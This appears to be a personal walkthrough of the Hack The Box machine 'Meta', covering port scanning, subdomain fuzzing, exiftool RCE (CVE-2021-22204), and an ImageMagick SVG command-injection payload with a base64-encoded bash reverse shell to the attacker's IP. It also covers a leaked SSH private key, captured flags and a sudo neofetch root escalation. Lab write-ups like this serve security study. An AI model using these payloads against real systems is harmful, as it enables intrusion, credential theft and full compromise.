@@ -1,0 +1,307 @@
+let's enumerate first
+command: sudo rustscan -a 10.10.11.140
+result:
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+command: sudo nmap -sSVC -A -p 22,80 10.10.11.140
+result:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 1281175a5ac9c600dbf0ed9364fd1e08 (RSA)
+|   256 b5e55953001896a6f842d8c7fb132049 (ECDSA)
+|_  256 05e9df71b59f25036bd0468d05454420 (ED25519)
+80/tcp open  http    Apache httpd
+|_http-title: Home
+|_http-server-header: Apache
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.4 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 22/tcp)
+HOP RTT      ADDRESS
+1   47.28 ms 10.10.16.1
+2   17.42 ms artcorp.htb (10.10.11.140)
+
+put 10.10.11.140 artcorp.htb to /etc/hosts
+
+command: wfuzz -u http://10.10.11.140 -H "Host: FUZZ.artcorp.htb" -w /snap/seclists/34/Discovery/DNS/subdomains-top1million-5000.txt --hh 0
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.140/
+Total requests: 4989
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                   
+=====================================================================
+
+000001492:   200        9 L      24 W       247 Ch      "dev01"                   
+
+Total time: 20.44022
+Processed Requests: 4989
+Filtered Requests: 4988
+Requests/sec.: 244.0775
+
+add this 10.10.11.140 artcorp.htb dev01.artcorp.htb subdomain to /etc/hosts
+
+access: http://artcorp.htb/
+
+command: ./feroxbuster -u http://artcorp.htb -w /snap/feroxbuster/common/wordlist/raft-medium-directories.txt
+result:
+403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+404      GET        7l       23w      196c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+301      GET        7l       20w      231c http://artcorp.htb/css => http://artcorp.htb/css/
+200      GET        8l       29w    28898c http://artcorp.htb/assets/favicon.ico
+200      GET      527l     3096w   245698c http://artcorp.htb/assets/img/testimonials-1.jpg
+200      GET      667l     3783w   358197c http://artcorp.htb/assets/img/bg-showcase-2.jpg
+200      GET      979l     5219w   453969c http://artcorp.htb/assets/img/testimonials-3.jpg
+200      GET    11368l    21577w   208315c http://artcorp.htb/css/styles.css
+200      GET      875l     4337w   348111c http://artcorp.htb/assets/img/testimonials-2.jpg
+200      GET       86l      263w     4427c http://artcorp.htb/
+301      GET        7l       20w      234c http://artcorp.htb/assets => http://artcorp.htb/assets/
+301      GET        7l       20w      238c http://artcorp.htb/assets/img => http://artcorp.htb/assets/img/
+[####################] - 27s   120021/120021  0s      found:10      errors:0      
+[####################] - 24s    30000/30000   1248/s  http://artcorp.htb/ 
+[####################] - 25s    30000/30000   1179/s  http://artcorp.htb/css/ 
+[####################] - 21s    30000/30000   1460/s  http://artcorp.htb/assets/ 
+[####################] - 21s    30000/30000   1432/s  http://artcorp.htb/assets/img/
+
+access: http://dev01.artcorp.htb/
+access: http://dev01.artcorp.htb/metaview/
+
+like online exiftool tools.
+
+command: ./feroxbuster -u http://dev01.artcorp.htb -x php -w /snap/feroxbuster/common/wordlist/raft-medium-directories.txt
+result:
+403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+404      GET        7l       23w      196c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET        9l       24w      247c http://dev01.artcorp.htb/
+301      GET        7l       20w      242c http://dev01.artcorp.htb/metaview => http://dev01.artcorp.htb/metaview/
+301      GET        7l       20w      249c http://dev01.artcorp.htb/metaview/assets => http://dev01.artcorp.htb/metaview/assets/
+200      GET        9l       24w      247c http://dev01.artcorp.htb/index.php
+200      GET       19l       28w      214c http://dev01.artcorp.htb/metaview/css/styles.css
+301      GET        7l       20w      246c http://dev01.artcorp.htb/metaview/css => http://dev01.artcorp.htb/metaview/css/
+301      GET        7l       20w      250c http://dev01.artcorp.htb/metaview/uploads => http://dev01.artcorp.htb/metaview/uploads/
+200      GET       33l       83w     1404c http://dev01.artcorp.htb/metaview/index.php
+200      GET        6l     1963w   155713c http://dev01.artcorp.htb/metaview/css/bootstrap.min.css
+301      GET        7l       20w      246c http://dev01.artcorp.htb/metaview/lib => http://dev01.artcorp.htb/metaview/lib/
+301      GET        7l       20w      249c http://dev01.artcorp.htb/metaview/vendor => http://dev01.artcorp.htb/metaview/vendor/
+200      GET        0l        0w        0c http://dev01.artcorp.htb/metaview/vendor/autoload.php
+301      GET        7l       20w      258c http://dev01.artcorp.htb/metaview/vendor/composer => http://dev01.artcorp.htb/metaview/vendor/composer/
+200      GET       56l      398w     2919c http://dev01.artcorp.htb/metaview/vendor/composer/LICENSE
+[####################] - 2m    240030/240030  0s      found:14      errors:810    
+[####################] - 81s    30000/30000   373/s   http://dev01.artcorp.htb/ 
+[####################] - 82s    30000/30000   368/s   http://dev01.artcorp.htb/metaview/ 
+[####################] - 84s    30000/30000   355/s   http://dev01.artcorp.htb/metaview/css/ 
+[####################] - 81s    30000/30000   369/s   http://dev01.artcorp.htb/metaview/assets/ 
+[####################] - 79s    30000/30000   377/s   http://dev01.artcorp.htb/metaview/lib/ 
+[####################] - 80s    30000/30000   375/s   http://dev01.artcorp.htb/metaview/uploads/ 
+[####################] - 79s    30000/30000   379/s   http://dev01.artcorp.htb/metaview/vendor/ 
+[####################] - 33s    30000/30000   908/s   http://dev01.artcorp.htb/metaview/vendor/composer/ 
+
+command: ./feroxbuster -u http://dev01.artcorp.htb/metaview -x php -w /snap/feroxbuster/common/wordlist/raft-medium-directories.txt
+result:
+404      GET        7l       23w      196c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+403      GET        7l       20w      199c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+301      GET        7l       20w      242c http://dev01.artcorp.htb/metaview => http://dev01.artcorp.htb/metaview/
+301      GET        7l       20w      249c http://dev01.artcorp.htb/metaview/assets => http://dev01.artcorp.htb/metaview/assets/
+200      GET       33l       83w     1404c http://dev01.artcorp.htb/metaview/index.php
+200      GET       19l       28w      214c http://dev01.artcorp.htb/metaview/css/styles.css
+200      GET        6l     1963w   155713c http://dev01.artcorp.htb/metaview/css/bootstrap.min.css
+301      GET        7l       20w      246c http://dev01.artcorp.htb/metaview/lib => http://dev01.artcorp.htb/metaview/lib/
+301      GET        7l       20w      246c http://dev01.artcorp.htb/metaview/css => http://dev01.artcorp.htb/metaview/css/
+301      GET        7l       20w      250c http://dev01.artcorp.htb/metaview/uploads => http://dev01.artcorp.htb/metaview/uploads/
+301      GET        7l       20w      249c http://dev01.artcorp.htb/metaview/vendor => http://dev01.artcorp.htb/metaview/vendor/
+200      GET        0l        0w        0c http://dev01.artcorp.htb/metaview/vendor/autoload.php
+301      GET        7l       20w      258c http://dev01.artcorp.htb/metaview/vendor/composer => http://dev01.artcorp.htb/metaview/vendor/composer/
+200      GET       56l      398w     2919c http://dev01.artcorp.htb/metaview/vendor/composer/LICENSE
+[####################] - 2m    210029/210029  0s      found:12      errors:213    
+[####################] - 69s    30000/30000   434/s   http://dev01.artcorp.htb/metaview/ 
+[####################] - 72s    30000/30000   418/s   http://dev01.artcorp.htb/metaview/lib/ 
+[####################] - 71s    30000/30000   422/s   http://dev01.artcorp.htb/metaview/assets/ 
+[####################] - 69s    30000/30000   432/s   http://dev01.artcorp.htb/metaview/css/ 
+[####################] - 69s    30000/30000   435/s   http://dev01.artcorp.htb/metaview/uploads/ 
+[####################] - 68s    30000/30000   442/s   http://dev01.artcorp.htb/metaview/vendor/ 
+[####################] - 36s    30000/30000   825/s   http://dev01.artcorp.htb/metaview/vendor/composer/  
+
+access: http://dev01.artcorp.htb/metaview/composer.json
+result:
+{
+    "autoload": {
+        "files": ["lib/ExifToolWrapper.php"]
+    }
+}
+
+CVE-2021-22204 Background
+get exploit from here:
+https://github.com/UNICORDev/exploit-CVE-2021-22204
+
+command: python3 exploit-CVE-2021-22204.py -c 'id'
+then upload image.jpg
+result:
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+command: nc -lvnp 7979
+command: python3 exploit-CVE-2021-22204.py -s 10.10.16.19 7979
+upload image.jpg
+
+please upgrade shell.
+
+command: /dev/shm
+upload pspy64 to target machine. chmod +x pspy64. then run it.
+take attention:2023/07/01 18:29:01 CMD: UID=1000  PID=5570   | /bin/sh -c /usr/local/bin/convert_images.sh 
+2023/07/01 18:29:01 CMD: UID=1000  PID=5569   | /bin/sh -c /usr/local/bin/convert_images.sh 
+2023/07/01 18:29:01 CMD: UID=0     PID=5572   | /usr/sbin/CRON -f 
+2023/07/01 18:29:01 CMD: UID=0     PID=5573   | /bin/sh -c rm /tmp/* 
+2023/07/01 18:29:01 CMD: UID=1000  PID=5574   | /bin/bash /usr/local/bin/convert_images.sh 
+2023/07/01 18:29:01 CMD: UID=1000  PID=5575   | /bin/bash /usr/local/bin/convert_images.sh 
+
+command: cat /usr/local/bin/convert_images.sh 
+#!/bin/bash
+cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
+pkill mogrify
+
+CVE-2020-29599:  mogrify Command Injection
+please put this exploit with poc.svg:
+<image authenticate='ff" `echo $(id)> /dev/shm/.0xdf`;"'>
+  <read filename="pdf:/etc/passwd"/>
+  <get width="base-width" height="base-height" />
+  <resize geometry="400x400" />
+  <write filename="test.png" />
+  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">       
+  <image xlink:href="msl:poc.svg" height="100" width="100"/>
+  </svg>
+</image>
+in this location /var/www/dev01.artcorp.htb/convert_images/
+
+test if befor cron executed it.
+command: mogrify -format png *.* 
+then delete .0xdf
+
+wait a minutes.
+check if svg still exist.
+command: ls -al /var/www/dev01.artcorp.htb/convert_images/
+total 12
+drwxrwxr-x 2 root     www-data 4096 Jul  1 18:32 .
+drwxr-xr-x 4 root     root     4096 Oct 18  2021 ..
+-rw-r--r-- 1 www-data www-data  399 Jul  1 18:32 poc.svg
+
+command: ls -al /dev/shm
+total 3036
+drwxrwxrwt  2 root     root          80 Jul  1 18:41 .
+drwxr-xr-x 16 root     root        3080 Jul  1 14:00 ..
+-rw-r--r--  1 thomas   thomas        54 Jul  1 18:41 .0xdf
+-rwxr-xr-x  1 www-data www-data 3104768 Jan 17 16:09 pspy64
+
+command: echo 'bash -i >& /dev/tcp/10.10.16.19/4444 0>&1 ' | base64
+result:
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xOS80NDQ0IDA+JjEgCg==
+
+command: nc -lvnp 4444
+
+put this mog-shell.svg on /var/www/dev01.artcorp.htb/convert_images: 
+<image authenticate='ff" `echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xOS80NDQ0IDA+JjEgCg==" | base64 -d | bash`;"'>
+  <read filename="pdf:/etc/passwd"/>
+  <get width="base-width" height="base-height" />
+  <resize geometry="400x400" />
+  <write filename="test.png" />
+  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <image xlink:href="msl:mog-shell.svg" height="100" width="100"/>
+  </svg>
+</image>
+
+wait some minutes.
+
+get tomas .ssh
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE=
+-----END OPENSSH PRIVATE KEY-----
+
+command: ssh -i id_rsa thomas@10.10.11.140
+
+command: cat user.txt 
+14ffa6d5373cd068c063c201d33375ab
+
+command: sudo -l
+Matching Defaults entries for thomas on meta:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    env_keep+=XDG_CONFIG_HOME
+
+User thomas may run the following commands on meta:
+    (root) NOPASSWD: /usr/bin/neofetch \"\"
+
+command: echo "$XDG_CONFIG_HOME"
+command: echo "$HOME"
+/home/thomas
+
+command: /home/thomas/.config/neofetch
+command: sudo neofetch
+       _,met$$$$$gg.          root@meta 
+    ,g$$$$$$$$$$$$$$$P.       --------- 
+  ,g$$P"     """Y$$.".        OS: Debian GNU/Linux 10 (buster) x86_64 
+ ,$$P'              `$$$.     Host: VMware Virtual Platform None 
+',$$P       ,ggs.     `$$b:   Kernel: 4.19.0-17-amd64 
+`d$$'     ,$P"'   .    $$$    Uptime: 4 hours, 47 mins 
+ $$P      d$'     ,    $$P    Packages: 495 (dpkg) 
+ $$:      $$.   -    ,d$$'    Shell: bash 5.0.3 
+ $$;      Y$b._   _,d$P'      CPU: AMD EPYC 7302P 16- (2) @ 2.994GHz 
+ Y$$.    `.`"Y$$$$P"'         GPU: VMware SVGA II Adapter 
+ `$$b      "-.__              Memory: 138MiB / 1994MiB 
+  `Y$$
+   `Y$$.                                              
+     `$$b.
+       `Y$$b.
+          `"Y$b._
+              `"""
+
+
+command: echo 'exec /bin/sh' > .config/neofetch/config.conf 
+command: XDG_CONFIG_HOME=~/.config sudo neofetch
+command: bash 
+command: cat /root/root.txt
+6b76c6b45bd2028ca92b179413f99ba7
+
+resource:
+https://0xdf.gitlab.io/2022/06/11/htb-meta.html#shell-as-root
+https://www.secjuice.com/htb-meta-walkthrough/
